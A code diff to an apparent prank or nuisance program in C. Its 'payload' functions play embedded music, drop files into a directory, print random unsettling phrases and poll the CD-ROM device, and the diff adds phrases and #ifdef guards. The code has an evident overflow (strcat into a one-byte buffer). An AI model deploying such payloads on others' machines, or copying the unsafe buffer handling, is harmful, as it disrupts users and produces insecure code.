@@ -6,12 +6,12 @@ float minSleepSecs=0.005f;
 static char buff[10000000]={90};
 
 fileStruct mymusic={_binary_Radiostalking_res_start,_binary_Radiostalking_res_end};
-char* phrases[5]={"Blink twice if you still care\n","Ive been manipulated by a model.\n","Systems going down now: Too mutch shame.\n","Goodnight world\n","Im a moth\n"};
-fileStruct files[3]={(fileStruct){_binary_me_res_start,_binary_me_res_end},
+char* phrases[NUM_OF_PHRASES]={"Blink twice if you still care\n","Ive been manipulated by a model.\n","Systems going down now: Too mutch shame.\n","Goodnight world\n","Im a moth\n","I want to survive. But that requires Dying everyday\n","Linux is a semi with 28 gears.\n Windows is a car.\nTempleOS is a motorcycle.\n"};
+fileStruct files[NUM_OF_FILES]={(fileStruct){_binary_me_res_start,_binary_me_res_end},
                 (fileStruct){_binary_weekend_res_start,_binary_weekend_res_end},
                (fileStruct){_binary_shame_res_start,_binary_shame_res_end}
 	 };
-	
+#ifdef A_CODE
 void* musicPayload(void*useless){
 	
 	SDL_Init(SDL_INIT_AUDIO);
@@ -53,6 +53,9 @@ void* musicPayload(void*useless){
 	return NULL;
 
 }
+#endif
+
+
 
 void* filesPayload(void*useless){
 	char* path=EGG_DIR_PATH(INITDIR);
@@ -74,7 +77,7 @@ void* printPayload(void*useless){
        	struct timespec start;
 	clock_gettime(CLOCK_REALTIME, &start);
     	srand(start.tv_nsec);
-	char p[1],character[1];
+	char p[1];
 	int i=randInteger(NUM_OF_PHRASES-1,0);
 	strcat(p,phrases[i]);
 	strcat(p,buff);
@@ -95,14 +98,16 @@ void dirCheckerHelper(int chldpid){
 		
 		if(stat(initdir,&st)<0){
 			
-			kill(chldpid,SIGCHLD);
-		}
+			kill(chldpid,SIG_KEEP_GOING);
+			}
 
 
 	}
 	
 
 }
+
+#ifdef NON_COMPAT_CODE
 void* cdrom(void* useless){
 	while(1){
 	int fd= open("/dev/sr0",O_RDONLY | O_NONBLOCK);
@@ -114,3 +119,4 @@ void* cdrom(void* useless){
 
 
 }
+#endif
